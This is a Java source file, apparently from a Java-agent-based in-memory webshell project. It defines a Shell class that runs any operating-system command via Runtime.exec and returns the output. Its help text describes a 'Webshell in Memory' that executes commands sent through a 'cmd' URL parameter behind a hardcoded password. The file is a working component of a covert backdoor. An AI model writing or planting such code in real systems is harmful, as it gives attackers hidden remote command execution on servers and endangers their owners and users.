package priv.ga0weI.baseonagent;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class Shell {

    public static String execute(String cmd) throws Exception {
        String result = "";
        if (cmd != null && cmd.length() > 0) {

            Process p = Runtime.getRuntime().exec(cmd);
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while (disr != null) {
                result = result + disr + "\n";
                disr = dis.readLine();
            }
        }
        return result;
    }

    public static String help() {
        return "Webshell in Memory:\n\n" + "Usage:\n" + "anyurl?passwod=ga0weI //show this help page.\n"
                + "anyurl?passwod=ga0weI&cmd=whoami  //run os command.\n";
    }
}
